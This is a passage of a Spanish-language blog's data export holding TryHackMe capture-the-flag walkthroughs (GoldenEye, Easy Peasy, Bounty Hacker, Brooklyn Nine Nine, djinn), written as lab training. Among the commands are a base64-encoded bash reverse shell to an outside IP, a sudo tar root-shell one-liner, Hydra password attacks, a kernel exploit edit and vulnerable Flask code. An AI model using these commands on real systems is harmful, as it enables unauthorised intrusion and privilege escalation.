MOODLE Utilizamos las credenciales de doak en moodle. Encontramos un archivo que contiene una direccion a una imagen, que segun el mensaje ahi se encuentran las credenciales del usuario admin.\nDescargamos la imagen y al analizarla con exiftool encontramos una cadena de texto codificada en base64.\nUtilizamos la \u0026ldquo;contraseña\u0026rdquo; que encontramos en moodle con el usuario admin y logramos obtener acceso.\nWWW-DATA - USER Dentro de moodle agregamos una shell inversa en la configuracion del PATH de ASPELL.\nTambien configuramos el parametro del plugin TinyMCE a PSpellShell.\nPusimos a la escucha netcat, creamos una nueva entrada de blog donde vemos la opcion de spell, que al presionar el boton, se ejecuta nuestra shell.\nLogramos obtener una shell con el usuario www-data.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con uname -a y vemos la version del kernel, al revisar si existe un exploit encontramos Linux Kernel 3.13.0 - Local Privilege Escalation, el cual descargamos y ejecutamos en la maquina, pero nos dio un error y es que gcc no está instalado en la maquina.\nPor lo que buscamos alternativas a gcc y encontramos clang, el cual si esta instalado en la maquina. Editamos el exploit cambiando gcc por clang, descargamos, ejecutamos el exploit en la maquina y logramos obtener una shell con usuario root.\ngcc a clang.\n1 2  -lib = system(\u0026#34;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w\u0026#34;); +lib = system(\u0026#34;clang -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w\u0026#34;);   Y nuestra flag root.txt.\n","description":"GoldenEye es una maquina de TryHackMe, enfocada en la tematica de Golden Eye encontramos multiples usuarios los cuales utilizamos con Hydra en POP3 donde obtuvimos acceso y credenciales para Moodle que posteriormente nos devolvio a POP3 donde encontramos credenciales de administracion para Moodle donde luego explotamos una vulnerabilidad para obtener acceso. Finalmente explotamos una vulnerabilidad en el Kernel de Linux para escalar privilegios.","id":57,"section":"posts","tags":["pop3","hydra","pop3","moodle"],"title":"TryHackMe - GoldenEye","uri":"https://sckull.github.io/posts/goldeneye/"},{"content":"  Easy Peasy es una maquina de TryHackMe, presenta retos de Esteganografia y Crackeo de hashes para obtener user. Un CronJob permitio obtener acceso privilegiado.\nRoom    Titulo Easy Peasy      Descripción Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.   Puntos 630   Dificultad Facil   Maker kral4     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80), ssh (6498) y http (65524) abierto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  # Nmap 7.80 scan initiated Wed Aug 5 01:17:20 2020 as: nmap -p- -T4 -o nmap_scan -v easy.thm Increasing send delay for 10.10.162.162 from 0 to 5 due to 21 out of 52 dropped probes since last increase. Nmap scan report for easy.thm (10.10.162.162) Host is up (0.26s latency). Not shown: 65532 closed ports PORT STATE SERVICE 80/tcp open http 6498/tcp open unknown 65524/tcp open unknown Read data files from: /usr/bin/../share/nmap # Nmap done at Wed Aug 5 01:39:35 2020 -- 1 IP address (1 host up) scanned in 1335.29 seconds # Nmap 7.80 scan initiated Wed Aug 5 01:46:14 2020 as: nmap -sV -p 80,6498,65524 -o services_scan easy.thm Nmap scan report for easy.thm (10.10.162.162) Host is up (0.29s latency). PORT STATE SERVICE VERSION 80/tcp open http nginx 1.16.1 6498/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 65524/tcp open http Apache httpd 2.4.43 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Aug 5 01:46:30 2020 -- 1 IP address (1 host up) scanned in 15.45 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4  root@upset:~/thm/easypeasy gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://easy.thm/ -q -t 250 -x php,html,txt /index.html (Status: 200) /robots.txt (Status: 200) /hidden (Status: 301)   Encontramos el archivo robots.txt el cual no contiene ninguna url excluida, tambien la pagina hidden donde encontramos una imagen de fondo.\nEjecutamos nuevamente RUSTUBUSTER pero ahora en el directorio/pagina hidden.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  root@upset:~/thm/easypeasy /opt/rustbuster/rustbuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://easy.thm/hidden/ -t 155 -e php,html,txt -o out_hidden.txt ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~tarted at\t: 2020-08-05 00:52:23 GET\t200 OK\thttp://easy.thm/hidden/ GET 200 OK http://easy.thm/hidden/index.html GET 301 Moved Permanently http://easy.thm/hidden/whatever =\u0026gt; http://easy.thm/hidden/whatever/ GET 200 OK http://easy.thm/hidden/ ^C   En una de las paginas encontradas vemos base64, el cual contiene una flag.\nHTTP 65524 Encontramos la pagina de apache en el puerto 65524.\nEncontramos en el codigo fuente una flag.\nAdemás un parrafo escondido, con una cadena de caracteres \u0026ldquo;codificado\u0026rdquo;.\nEjecutamos rustbuster en este puerto al igual que en el puerto 80.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  root@upset:~/thm/easypeasy /opt/rustbuster/rustbuster dir -u http://easy.thm:65524/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 150 -e php,html,txt -o high_port.txt ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~tarted at\t: 2020-08-05 01:14:24 GET\t200 OK\thttp://easy.thm:65524/ GET 403 Forbidden http://easy.thm:65524/.html GET 200 OK http://easy.thm:65524/index.html GET 200 OK http://easy.thm:65524/robots.txt C^   En robots.txt encontramos un hash MD5, utilizamos md5hashing para obtener el texto plano el cual es una flag.\nRustbuster no nos dio mas que errores, por lo que nos concentramos en el texto \u0026ldquo;codificado\u0026rdquo; que encontramos. Utilizamos CyberChef para poder decodificar el texto. Encontramos que es posiblo utilizando base62, el cual nos devolvio lo que parece ser un directorio.\nEncontramos en este nuevo directorio lo que parece ser un hash SHA-256.\nUtilizamos nuevamente md5hashing el cual nos mostró una \u0026ldquo;contraseña\u0026rdquo;.\nDescargamos la imagen de la pagina, utilizando steghide y la contraseña que encontramos logramos encontrar un archivo que contiene codificado en binario un texto y el nombre de un usuario.\nNuevamente con CyberChef logramos obtener el texto.\nBORING - USER Con las credenciales que encontramos ingresamos por medio del servicio SSH de la maquina en el puerto 6498.\nEncontramos nuestra flag user.txt la cual esta \u0026lsquo;rotada\u0026rsquo;.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con cat /etc/crontab y vemos cron que se ejecuta con el usuario root y que ejecuta el archivo .mysecretcronjob.sh en /var/www/.\nEl archivo no contiene ningun comando por lo que agregamos una shell inversa al archivo.\nEjecutamos netcat para esperar la conexion de nuestra shell, obtuvimos una shell con usuario root y nuestra flag root.txt.\n","description":"Easy Peasy es una maquina de TryHackMe, presenta retos de Esteganografia y Crackeo de hashes para obtener user. Un CronJob permitio obtener acceso privilegiado.","id":58,"section":"posts","tags":["steganography","steghide","cron"],"title":"TryHackMe - Easy Peasy","uri":"https://sckull.github.io/posts/easypeasy/"},{"content":"  Bounty Hacker es una maquina de TryHackMe. Enumeramos el servicio FTP donde observamos un wordlist el cual utilizamos para realizar un ataque de contraseñas con Hydra para obtener acceso por SSH. Escalamos privilegios con sudo y tar.\nRoom    Titulo Bounty Hacker      Descripción You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!   Puntos 150   Dificultad Facil   Maker Sevuhl     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12  # Nmap 7.80 scan initiated Sat Aug 1 10:19:44 2020 as: nmap -sV -o nmap_scan_mini bountyhacker.thm Nmap scan report for bountyhacker.thm (10.10.131.158) Host is up (0.28s latency). Not shown: 967 filtered ports, 30 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Aug 1 10:20:09 2020 -- 1 IP address (1 host up) scanned in 24.80 seconds   FTP En el puerto 21 FTP logramos ingresar como anonymous en donde encontramos dos archivos, uno que contiene lo que parece ser un wordlist, el segundo dos \u0026ldquo;tareas\u0026rdquo; y un posible nombre de usuario.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  root@upset:~/thm/bountyhacker# ftp bountyhacker.thm Connected to bountyhacker.thm. 220 (vsFTPd 3.0.3) Name (bountyhacker.thm:root): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-rw-r-- 1 ftp ftp 418 Jun 07 21:41 locks.txt -rw-rw-r-- 1 ftp ftp 68 Jun 07 21:47 task.txt 226 Directory send OK. ftp\u0026gt; get locks.txt local: locks.txt remote: locks.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for locks.txt (418 bytes). 226 Transfer complete. 418 bytes received in 0.04 secs (10.7433 kB/s) ftp\u0026gt; get task.txt local: task.txt remote: task.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for task.txt (68 bytes). 226 Transfer complete. 68 bytes received in 0.00 secs (295.1389 kB/s) ftp\u0026gt; exit 221 Goodbye. root@upset:~/thm/bountyhacker# cat locks.txt rEddrAGON ReDdr4g0nSynd!cat3 Dr@gOn$yn9icat3 [... REDACTED ...] REd$yNdIc47e dr@goN5YNd1c@73 rEDdrAGOnSyNDiCat3 r3ddr@g0N ReDSynd1ca7e root@upset:~/thm/bountyhacker# cat task.txt 1.) Protect Vicious. 2.) Plan for Red Eye pickup on the moon. -lin root@upset:~/thm/bountyhacker#   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos, no encontramos nada interesante.\n1 2 3 4 5  root@upset:~/thm/bountyhacker# gobuster dir -u http://bountyhacker.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403)   LIN - USER Utilizamos el usuario y el \u0026ldquo;wordlist\u0026rdquo; que encontramos en el puerto 21 con Hydra en el puerto 22 de SSH, donde logramos encontrar la contraseña para este usuario.\nLogramos obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando tar. Utilizamos tar para obtener una shell root.\n1  sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh   Obtuvimos una shell con usuario root y nuestra flag root.txt.\n","description":"Bounty Hacker es una maquina de TryHackMe. Enumeramos el servicio FTP donde observamos un wordlist el cual utilizamos para realizar un ataque de contraseñas con Hydra para obtener acceso por SSH. Escalamos privilegios con sudo y tar.","id":59,"section":"posts","tags":["ftp","sudo privesc","hydra"],"title":"TryHackMe - Bounty Hacker","uri":"https://sckull.github.io/posts/bountyhacker/"},{"content":"  Brooklyn Nine Nine es una maquina de TryHackMe, presenta un reto de esteganografia y permisos SUID en vim.\nRoom    Titulo Brooklyn Nine Nine      Descripción This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.   Puntos 80   Dificultad Facil   Maker Fsociety2006     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12  # Nmap 7.80 scan initiated Wed Jul 29 16:46:49 2020 as: nmap -sV -o nmap_scan_mini brooklyn.thm Nmap scan report for brooklyn.thm (10.10.125.15) Host is up (0.31s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jul 29 16:47:33 2020 -- 1 IP address (1 host up) scanned in 43.91 seconds   FTP Ingresamos en el servicio FTP con las credenciales de anonymous (anonymous:anonymous) donde encontramos una nota, además dos posibles nombres de usuario Amy y Jake.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  root@upset:~/thm/brooklyn# ftp brooklyn.thm Connected to brooklyn.thm. 220 (vsFTPd 3.0.3) Name (brooklyn.thm:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 119 May 17 23:17 note_to_jake.txt 226 Directory send OK. ftp\u0026gt; get note_to_jake.txt local: note_to_jake.txt remote: note_to_jake.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes). 226 Transfer complete. 119 bytes received in 0.01 secs (12.3510 kB/s) ftp\u0026gt; exit 221 Goodbye. root@upset:~/thm/brooklyn# cat note_to_jake.txt From Amy, Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine root@upset:~/thm/brooklyn#   HTTP Encontramos una pagina web en el puerto 80.\nEn el codigo fuente de la pagina encontramos un comentario que habla sobre esteganografia.\n1 2  \u0026lt;p\u0026gt;This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.\u0026lt;/p\u0026gt; \u0026lt;!-- Have you ever heard of steganography? --\u0026gt;   Utilizamos STEGCRACKER para hacer un ataque de contraseñas a la imagen. Encontramos la contraseña y un archivo que contiene una contraseña, además un posible usuario Holt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  root@upset:~/thm/brooklyn# stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt StegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker) Copyright (c) 2020 - Luke Paris (Paradoxis) Counting lines in wordlist.. Attacking file \u0026#39;brooklyn99.jpg\u0026#39; with wordlist \u0026#39;/usr/share/wordlists/rockyou.txt\u0026#39;.. Successfully cracked file with password: admin Tried 20587 passwords Your file has been written to: brooklyn99.jpg.out admin root@upset:~/thm/brooklyn# cat brooklyn99.jpg.out Holts Password: fluf[... REDACTED ...]nenine Enjoy!! root@upset:~/thm/brooklyn#   GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2  root@upset:~/thm/brooklyn# gobuster dir -u http://brooklyn.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 25 -x php,html,txt /index.html (Status: 200)   HOLT - USER Utilizamos la contraseña con los usuarios que encontramos y logramos obtener una shell con el usuario holt, y la flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando nano. Utilizamos env para obtener una shell root.\nUtilizamos GFOBINS - NANO para obtener una shell con el usuario root y nuestra flag root.txt.\n","description":"Brooklyn Nine Nine es una maquina de TryHackMe, presenta un reto de esteganografia y permisos SUID en vim.","id":60,"section":"posts","tags":["ftp","steganography","stegcracker","nano"],"title":"TryHackMe - Brooklyn Nine Nine","uri":"https://sckull.github.io/posts/brooklyn99/"},{"content":"  djinn es una maquina de TryHackMe, ejecutamos una shell inversa en una ruta de la aplicacion web, en el codigo fuente encontramos la ruta de un archivo con credenciales que nos permitio acutalizar nuestra shell al siguiente usuario que además obtuvimos acceso por SSH realizando Port Knocking. Para el movimiento lateral ejecutamos genie con parametros para una shell. Escalamos privilegios analizando el codigo fuente de un script en Python el cual no tenia validaciones en las variables lo que nos permitía ejecutar /bin/sh.\nRoom    Titulo djinn      Descripción Intermediate level vulnerable box.   Puntos *   Dificultad Media   Maker falconfeast     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59  # Nmap 7.80 scan initiated Sat Aug 1 11:03:49 2020 as: nmap -sV -o nmap_scan_mini djinn.thm Nmap scan report for djinn.thm (10.10.181.33) Host is up (0.26s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp filtered ssh Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Aug 1 11:03:57 2020 -- 1 IP address (1 host up) scanned in 7.89 seconds # Nmap 7.80 scan initiated Sat Aug 1 11:03:02 2020 as: nmap -sV -p- -T5 -o nmap_scan djinn.thm Warning: 10.10.181.33 giving up on port because retransmission cap hit (2). Nmap scan report for djinn.thm (10.10.181.33) Host is up (0.25s latency). Not shown: 65115 closed ports, 417 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 1337/tcp open waste? 7331/tcp open http Werkzeug httpd 0.16.0 (Python 2.7.15+) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port1337-TCP:V=7.80%I=7%D=8/1%Time=5F2594CD%P=x86_64-pc-linux-gnu%r(NUL SF:L,1BC,\u0026#34;\\x20\\x20____\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_____\\x20_\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\x20/\\x20___\\|\\x20__\\x SF:20_\\x20_\\x20__\\x20___\\x20\\x20\\x20___\\x20\\x20\\|_\\x20\\x20\\x20_\\(_\\)_\\x20_ SF:_\\x20___\\x20\\x20\\x20___\\x20\\n\\|\\x20\\|\\x20\\x20_\\x20/\\x20_`\\x20\\|\\x20\u0026#39;_\\x SF:20`\\x20_\\x20\\\\\\x20/\\x20_\\x20\\\\\\x20\\x20\\x20\\|\\x20\\|\\x20\\|\\x20\\|\\x20\u0026#39;_\\x2 SF:0`\\x20_\\x20\\\\\\x20/\\x20_\\x20\\\\\\n\\|\\x20\\|_\\|\\x20\\|\\x20\\(_\\|\\x20\\|\\x20\\|\\x SF:20\\|\\x20\\|\\x20\\|\\x20\\|\\x20\\x20__/\\x20\\x20\\x20\\|\\x20\\|\\x20\\|\\x20\\|\\x20\\| SF:\\x20\\|\\x20\\|\\x20\\|\\x20\\|\\x20\\x20__/\\n\\x20\\\\____\\|\\\\__,_\\|_\\|\\x20\\|_\\|\\x SF:20\\|_\\|\\\\___\\|\\x20\\x20\\x20\\|_\\|\\x20\\|_\\|_\\|\\x20\\|_\\|\\x20\\|_\\|\\\\___\\|\\n\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n SF:\\nLet\u0026#39;s\\x20see\\x20how\\x20good\\x20you\\x20are\\x20with\\x20simple\\x20maths\\ SF:nAnswer\\x20my\\x20questions\\x201000\\x20times\\x20and\\x20I\u0026#39;ll\\x20give\\x20y SF:ou\\x20your\\x20gift\\.\\n\\(7,\\x20\u0026#39;\\*\u0026#39;,\\x209\\)\\n\u0026gt;\\x20\u0026#34;)%r(RPCCheck,1BC,\u0026#34;\\x2 SF:0\\x20____\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_____\\x20_\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\x20/\\x20___\\|\\x20__\\x20_\\x20_\\x SF:20__\\x20___\\x20\\x20\\x20___\\x20\\x20\\|_\\x20\\x20\\x20_\\(_\\)_\\x20__\\x20___\\x SF:20\\x20\\x20___\\x20\\n\\|\\x20\\|\\x20\\x20_\\x20/\\x20_`\\x20\\|\\x20\u0026#39;_\\x20`\\x20_\\x SF:20\\\\\\x20/\\x20_\\x20\\\\\\x20\\x20\\x20\\|\\x20\\|\\x20\\|\\x20\\|\\x20\u0026#39;_\\x20`\\x20_\\x2 SF:0\\\\\\x20/\\x20_\\x20\\\\\\n\\|\\x20\\|_\\|\\x20\\|\\x20\\(_\\|\\x20\\|\\x20\\|\\x20\\|\\x20\\| SF:\\x20\\|\\x20\\|\\x20\\x20__/\\x20\\x20\\x20\\|\\x20\\|\\x20\\|\\x20\\|\\x20\\|\\x20\\|\\x20 SF:\\|\\x20\\|\\x20\\|\\x20\\x20__/\\n\\x20\\\\____\\|\\\\__,_\\|_\\|\\x20\\|_\\|\\x20\\|_\\|\\\\_ SF:__\\|\\x20\\x20\\x20\\|_\\|\\x20\\|_\\|_\\|\\x20\\|_\\|\\x20\\|_\\|\\\\___\\|\\n\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\nLet\u0026#39;s\\x2 SF:0see\\x20how\\x20good\\x20you\\x20are\\x20with\\x20simple\\x20maths\\nAnswer\\x2 SF:0my\\x20questions\\x201000\\x20times\\x20and\\x20I\u0026#39;ll\\x20give\\x20you\\x20your SF:\\x20gift\\.\\n\\(8,\\x20\u0026#39;\\+\u0026#39;,\\x206\\)\\n\u0026gt;\\x20\u0026#34;); Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Aug 1 11:15:40 2020 -- 1 IP address (1 host up) scanned in 758.06 seconds   FTP En el puerto 21 FTP logramos ingresar como anonymous en donde encontramos tres archivos, uno que contiene lo que parece ser credenciales, el segundo un mensaje para @nitish81299 (nada interesante en Github y Twitter) y un posible nombre de usuario.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  root@upset:~/thm/djinn# ftp djinn.thm Connected to djinn.thm. 220 (vsFTPd 3.0.3) Name (djinn.thm:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 115 4096 Oct 21 2019 . drwxr-xr-x 2 0 115 4096 Oct 21 2019 .. -rw-r--r-- 1 0 0 11 Oct 20 2019 creds.txt -rw-r--r-- 1 0 0 128 Oct 21 2019 game.txt -rw-r--r-- 1 0 0 113 Oct 21 2019 message.txt 226 Directory send OK. ftp\u0026gt; get creds.txt local: creds.txt remote: creds.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for creds.txt (11 bytes). 226 Transfer complete. 11 bytes received in 0.00 secs (54.5289 kB/s) ftp\u0026gt; get game.txt local: game.txt remote: game.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for game.txt (128 bytes). 226 Transfer complete. 128 bytes received in 0.00 secs (968.9923 kB/s) ftp\u0026gt; get message.txt local: message.txt remote: message.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for message.txt (113 bytes). 226 Transfer complete. 113 bytes received in 0.00 secs (144.6285 kB/s) ftp\u0026gt; exit 221 Goodbye. root@upset:~/thm/djinn# ls creds.txt game.txt message.txt nmap_scan_mini root@upset:~/thm/djinn# cat creds.txt nitu:[... REDACTED ...] root@upset:~/thm/djinn# cat message.txt @nitish81299 I am going on holidays for few days, please take care of all the work. And don\u0026#39;t mess up anything. root@upset:~/thm/djinn# cat game.txt oh and I forgot to tell you I\u0026#39;ve setup a game for you on port 1337. See if you can reach to the final level and get the prize. root@upset:~/thm/djinn#   HTTP Encontramos una pagina web en el puerto 7331.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3  root@upset:~/thm/djinn# gobuster dir -u http://djinn.thm:7331/ -w /usr/share/wordlists/dirbuster/directory-list-medium.txt -q -t 25 -x php,html,txt /wish /genie   WWW-DATA - USER Encontramos una pagina /wish donde al ingresar un comando, este se ejecuta pero el resultado lo muestra en una url redireccionada.\nEjecutamos una shell codificada:\n1 2 3 4  #Shell echo -n \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/1338 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; |base64 #Ejecutamos echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC8xMzM4IDA+JjEi|base64 -d|bash   Obtenemos una shell con el usuario www-data.\nNITISH - USER En el archivo app.py el cual ejecuta la pagina anterior encontramos una direccion a un archivo, este archivo contiene lo que parecen credenciales del usuario nitish.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57  import subprocess from flask import Flask, redirect, render_template, request, url_for app = Flask(__name__) app.secret_key = \u0026#34;key\u0026#34; + CREDS = \u0026#34;/home/nitish/.dev/creds.txt\u0026#34; RCE = [\u0026#34;/\u0026#34;, \u0026#34;.\u0026#34;, \u0026#34;?\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;^\u0026#34;, \u0026#34;$\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#34;;\u0026#34;] def validate(cmd): if CREDS in cmd and \u0026#34;cat\u0026#34; not in cmd: return True try: for i in RCE: for j in cmd: if i == j: return False return True except Exception: return False @app.route(\u0026#34;/\u0026#34;, methods=[\u0026#34;GET\u0026#34;]) def index(): return render_template(\u0026#34;main.html\u0026#34;) @app.route(\u0026#34;/wish\u0026#34;, methods=[\u0026#39;POST\u0026#39;, \u0026#34;GET\u0026#34;]) def wish(): execute = request.form.get(\u0026#34;cmd\u0026#34;) if execute: if validate(execute): output = subprocess.Popen(execute, shell=True, stdout=subprocess.PIPE).stdout.read() else: output = \u0026#34;Wrong choice of words\u0026#34; return redirect(url_for(\u0026#34;genie\u0026#34;, name=output)) else: return render_template(\u0026#39;wish.html\u0026#39;) @app.route(\u0026#39;/genie\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def genie(): if \u0026#39;name\u0026#39; in request.args: page = request.args.get(\u0026#39;name\u0026#39;) else: page = \u0026#34;It\u0026#39;s not that hard\u0026#34; return render_template(\u0026#39;genie.html\u0026#39;, file=page) if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, debug=True)   Utilizamos la contraseña con el usuario y logramos obtener una shell con el usuario nitish y nuestra flag user.txt.\nUSER - SAM \u0026amp; KNOCKING PORT Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando genie esto con el usuario sam sin contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  nitish@djinn:~$ sudo -l -l sudo -l -l Matching Defaults entries for nitish on djinn: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User nitish may run the following commands on djinn: Sudoers entry: RunAsUsers: sam Options: !authenticate Commands: /usr/bin/genie nitish@djinn:~$   Otro de los hallazgos que hicimos es un archivo de configuracion de knock\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  nitish@djinn:/etc$ cat knockd.conf cat knockd.conf [options] UseSyslog [openSSH] sequence = 1356, 6784, 3409 seq_timeout = 5 command = /sbin/iptables -I INPUT 1 -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 3409, 6784, 1356 seq_timeout = 5 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn   Utilizamos la secuencia para obtener una shell en SSH.\nAhora si, seguimos investigando sobre /usr/bin/genie, le pasamos los parametros que pide este ejecutable, esperando a que ejecute nuestro comando, pero al parecer no se agrega en ningun tipo de cron o proceso\n1 2 3 4  nitish@djinn:/etc$ /usr/bin/genie -p bash -g -e \u0026#34;ping -c 5 